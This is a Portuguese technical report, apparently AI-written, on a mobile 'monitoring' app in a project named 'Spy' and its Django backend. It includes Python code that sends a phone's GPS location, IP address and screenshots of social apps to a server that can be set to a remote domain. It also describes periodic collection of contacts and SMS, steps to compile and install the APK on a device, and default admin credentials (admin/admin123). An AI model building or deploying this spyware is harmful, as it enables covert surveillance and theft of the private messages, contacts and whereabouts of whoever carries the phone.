# 📊 ANÁLISE DA COMUNICAÇÃO APP.PY ↔ DJANGO

## 🔍 Análise do Código

### 1. **Configuração de Comunicação no app.py**

```python
# Configurações no app.py (linha 12-14)
SERVER_IP = '127.0.0.1'
SERVER_PORT = '8000'
BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}"
```

**✅ CONFIRMADO**: O app.py está configurado para se comunicar com:
- **IP Local**: `127.0.0.1:8000` (localhost)
- **Protocolo**: HTTP POST/GET
- **Formato**: JSON

### 2. **Endpoints de Comunicação Identificados**

O app.py envia dados para os seguintes endpoints do Django:

| Endpoint | Dados Enviados | Status |
|----------|----------------|--------|
| `/api/localizacao/` | Latitude, Longitude, IMEI | ✅ Implementado |
| `/api/atividade/` | Atividade, Tipo, IMEI | ✅ Implementado |
| `/api/contatos/` | Lista de contatos | ✅ Implementado |
| `/api/sms/` | Lista de SMS | ✅ Implementado |
| `/api/upload/` | Screenshots, arquivos | ✅ Implementado |

### 3. **Métodos de Envio de Dados**

#### 📍 **Localização** (linha 244-256)
```python
def send_location(self, lat, lon):
    url = f"{BASE_URL}/api/localizacao/"
    data = {
        'imei': self.device_id,
        'latitude': lat,
        'longitude': lon,
        'timestamp': datetime.now().isoformat()
    }
    response = requests.post(url, json=data, timeout=10)
```

#### 🌐 **Informações de Rede** (linha 258-270)
```python
def send_network_info(self, ip):
    url = f"{BASE_URL}/api/atividade/"
    data = {
        'imei': self.device_id,
        'atividade': f'IP: {ip}',
        'tipo': 'rede',
        'timestamp': datetime.now().isoformat()
    }
    response = requests.post(url, json=data, timeout=10)
```

#### 📸 **Upload de Screenshots** (linha 300-315)
```python
def upload_screenshot(self, screenshot_path, app_name):
    url = f"{BASE_URL}/api/upload/"
    with open(screenshot_path, 'rb') as f:
        files = {'screenshot': f}
        data = {
            'imei': self.device_id,
            'tipo': f'screenshot_{app_name}'
        }
        response = requests.post(url, files=files, data=data, timeout=30)
```

## 🔄 **Fluxo de Comunicação**

### **Ciclo de Monitoramento** (linha 180-200)
1. **A cada 30 segundos** o app coleta dados
2. **Envia localização** se disponível
3. **Envia informações de rede** (IP)
4. **Verifica apps sociais** e tira screenshots
5. **A cada 10 ciclos** coleta contatos e SMS

### **Tratamento de Erros**
- ✅ **Timeout configurado**: 10-30 segundos
- ✅ **Try/catch implementado**: Não para o app se servidor offline
- ✅ **Logs de status**: Informa sucesso/falha no envio

## 🌐 **Comunicação com IPs**

### **IP Local (127.0.0.1)**
- ✅ **Configurado**: Sim, como padrão
- ✅ **Testável**: Sim, quando servidor Django roda localmente

### **IP Remoto**
Para usar IP remoto, altere no app.py:
```python
# Exemplo para IP da rede local
SERVER_IP = '192.168.0.97'  # IP do servidor na rede

# Exemplo para servidor remoto
SERVER_IP = 'meuservidor.com'  # Domínio ou IP público
```

## 📱 **Recepção no Django (manager.py/views.py)**

### **APIs Implementadas no Django**:

| API | Função | Status |
|-----|--------|--------|
| `api_localizacao` | Recebe GPS | ✅ Funcionando |
| `api_atividade_rede` | Recebe info de rede | ✅ Funcionando |
| `api_contatos` | Recebe contatos | ✅ Funcionando |
| `api_upload` | Recebe arquivos | ✅ Funcionando |
| `api_device_info` | Recebe info do dispositivo | ✅ Funcionando |

### **Armazenamento no Banco**:
- ✅ **Dispositivo**: Tabela principal com IMEI, IP, status
- ✅ **Localização**: Coordenadas GPS com timestamp
- ✅ **Atividades**: Log de todas as ações
- ✅ **Arquivos/Mídia**: Screenshots e arquivos enviados
- ✅ **Rede**: Informações de conectividade

## 🧪 **Como Testar**

### **1. Teste Local**
```bash
# Terminal 1: Iniciar servidor Django
cd Spy
python manage.py runserver

# Terminal 2: Testar comunicação
python testar_comunicacao_app.py
```

### **2. Teste com IP Remoto**
1. **Configure o IP** no app.py:
   ```python
   SERVER_IP = '192.168.0.97'  # Seu IP da rede
   ```

2. **Inicie servidor** no IP específico:
   ```bash
   python manage.py runserver 192.168.0.97:8000
   ```

3. **Execute o teste**:
   ```bash
   python testar_comunicacao_app.py
   ```

### **3. Verificar Dados Recebidos**
- **Interface Web**: `http://127.0.0.1:8000/dispositivos/`
- **Login**: `admin` / `admin123`
- **Procurar**: Dispositivo com IMEI do teste

## ✅ **CONCLUSÃO**

### **O app.py ESTÁ enviando dados para o Django:**
- ✅ **Localização GPS**
- ✅ **Informações de rede e IP**
- ✅ **Screenshots de apps sociais**
- ✅ **Contatos e SMS**
- ✅ **Status do dispositivo**

### **A comunicação funciona com:**
- ✅ **IP Local** (127.0.0.1)
- ✅ **IP da Rede Local** (192.168.x.x)
- ✅ **IP Remoto** (configurável)

### **Para testar no dispositivo real:**
1. **Compile o APK** com o IP correto
2. **Instale no dispositivo**
3. **Execute e clique em "Iniciar Monitoramento"**
4. **Verifique os dados** na interface web do Django

### **Arquivos de Teste Criados:**
- `testar_comunicacao_app.py` - Simula o app enviando dados
- `verificar_servidor_django.py` - Verifica se Django está OK